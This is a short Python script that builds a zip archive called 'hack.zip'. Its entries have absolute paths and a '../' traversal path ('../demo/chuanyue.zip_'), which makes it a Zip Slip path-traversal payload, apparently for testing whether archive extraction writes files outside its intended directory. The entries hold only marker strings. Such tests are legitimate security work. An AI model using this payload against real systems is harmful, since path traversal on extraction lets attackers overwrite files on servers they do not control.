import zipfile
import os
if __name__ == "__main__":
    try:
        binary1 = b'1ueeeeee'
        binary2 = b'hacked_by_1ue'
        cur = os.path.dirname(__file__)
        zipFile = zipfile.ZipFile(os.path.join(cur,"hack.zip"), "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("/baoliu/111", binary1)
        zipFile.writestr("/abc/test", binary1)
        zipFile.writestr("../demo/chuanyue.zip_", binary1)
        zipFile.close()
    except IOError as e:
        raise e
